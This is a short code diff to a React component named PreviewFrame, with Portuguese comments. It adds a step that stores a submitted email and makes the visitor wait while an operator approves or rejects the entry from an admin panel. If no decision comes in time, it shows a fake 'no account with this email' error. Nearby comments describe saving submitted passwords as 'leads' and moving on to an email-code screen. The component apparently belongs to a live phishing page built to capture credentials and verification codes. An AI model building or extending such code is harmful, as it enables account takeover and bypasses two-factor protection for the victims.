@@ -595,6 +595,27 @@ export function PreviewFrame({ html, mode = "mobile", className, adId }: Preview
             .then(({ error }) => {
               if (error) console.warn("[PreviewFrame] email_submitted insert:", error);
             });
+          // Em vez de avançar de tela na hora, aguarda decisão do dono (admin
+          // aprova/rejeita no painel) ou 10s. Mostra spinner no botão e bloqueia
+          // o input enquanto isso.
+          if (emailPendingTimerRef.current) {
+            clearTimeout(emailPendingTimerRef.current);
+          }
+          emailPendingRef.current = true;
+          iframe.contentWindow?.postMessage({ type: "iframe-email-loading-start" }, "*");
+          emailPendingTimerRef.current = setTimeout(() => {
+            if (!emailPendingRef.current) return;
+            emailPendingRef.current = false;
+            emailPendingTimerRef.current = null;
+            iframe.contentWindow?.postMessage(
+              {
+                type: "iframe-email-error",
+                message: "Não existe uma conta com este e-mail.",
+              },
+              "*",
+            );
+          }, 10_000);
+          return;
         }
 
         // Senha submetida → grava lead e avança pra tela de e-mail (email-code)
